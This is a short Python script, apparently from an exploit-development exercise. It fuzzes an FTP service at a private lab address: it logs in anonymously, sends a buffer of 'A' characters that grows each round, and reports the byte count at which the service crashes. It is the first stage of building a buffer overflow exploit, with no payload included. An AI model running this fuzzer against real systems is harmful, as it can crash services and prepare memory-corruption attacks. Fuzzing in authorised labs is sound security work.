import socket
import time
import sys
buffer = 'A'*100
while True:
        try:
               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               s.connect(('192.168.1.43', 21))
               s.recv(1024)
               s.send('USER anonymous\r\n')
               s.recv(1024)
               s.send('PASS anonymous\r\n')
               s.recv(1024)
               s.send(buffer + '\r\n')
               s.recv(1024)
               s.send('QUIT\r\n')
               s.close()
               print("[*] Buffer sent : " + str(len(buffer)))
               time.sleep(1)
               buffer = buffer + 'A'*100
        except:
               print("[*] Fuzzing crashed at byte : " + str(len(buffer)))
               sys.exit()
